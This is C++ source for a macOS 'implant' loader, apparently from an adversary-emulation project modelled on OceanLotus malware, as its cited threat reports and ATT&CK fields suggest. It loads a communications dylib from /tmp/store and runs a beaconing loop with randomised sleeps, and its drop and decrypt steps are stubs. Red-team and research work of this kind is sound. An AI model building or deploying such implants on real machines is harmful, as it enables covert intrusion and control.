#include <iostream>
#include <vector>
#include <dlfcn.h>

#include <mach-o/dyld.h>

#include "Comms.hpp"
#include "ClientPP.hpp"

const char * PATH_TO_COMMS_LIB = "/tmp/store";

/*
getPathToExecutable
    About:
        Get the path to the executable
    Result:
        string representing path to the executable
*/
std::string getPathToExecutable() {
    std::string exePath;
    char path[PATH_MAX+1];
    uint32_t size = sizeof(path);

    if (_NSGetExecutablePath(path, &size) == 0) {
        // get path to execution folder
        exePath = std::string(path);
        std::size_t last = exePath.find_last_of("/");
        exePath = exePath.substr(0, last)+"/";
    } else {
        std::cout << "[IMPLANT] Buffer too small" << std::endl;
        return "";
    }

    return exePath;
}

/*
dropComms
    About:
        Writes the embedded libComms.dylib to the path to the executable
    Result:
    MITRE ATT&CK Techniques:
    CTI:
    References:
*/
void dropComms(std::string exePath) {
    return;
}

/*
loadComms
    About:
        Responsible for finding, decrypting and loading the libComms dylib.
    Result:
        Returns pointer to the opened libComms dylib
    MITRE ATT&CK Techniques:
    CTI:
        https://www.welivesecurity.com/2019/04/09/oceanlotus-macos-malware-update/
    References:
        https://stackoverflow.com/q/43184544
        https://tldp.org/HOWTO/C++-dlopen/thesolution.html
*/
void* loadComms(std::string exePath) {
    // for each file in exePath (path to executable):
    //      try:
    //          decrypt file and output to /tmp/store
    //      catch:
    //          pass (ignore failures)

    return dlopen(PATH_TO_COMMS_LIB, RTLD_LAZY);
}

int main(int argc, const char * argv[]) {

    ClientPP client;

    client.pathProcess = getPathToExecutable();

    // drop embedded libComms.dylib to cwd
    dropComms(client.pathProcess);

    // load libComms.dylib
    client.dylib = loadComms(client.pathProcess);

    // check libComms was opened
    if (client.dylib == NULL) {
        std::cout << "[IMPLANT] unable to load libComms.dylib (" + std::string(PATH_TO_COMMS_LIB) + ")" << std::endl;
        return 1;
    }

    // main loop
    // Figure 9 - https://www.trendmicro.com/en_us/research/18/d/new-macos-backdoor-linked-to-oceanlotus-found.html
    int dwRandomTimeSleep = 0;
    time_t dwTimeSeed;
    int dwRandomValue;
    while ( 1 ) {
        // execute implant functionality
        if ( ClientPP::osInfo(dwRandomTimeSleep, &client))
            ClientPP::runClient(dwRandomTimeSleep, client.dylib);
        dwTimeSeed = time(0LL);
        srand(dwTimeSeed);
        dwRandomValue = rand()%(15000-5000+1)+5000;     // set sleep between 5-15 seconds
        dwRandomTimeSleep = dwRandomValue;
    }

    // finished execution, close
    return 0;
}
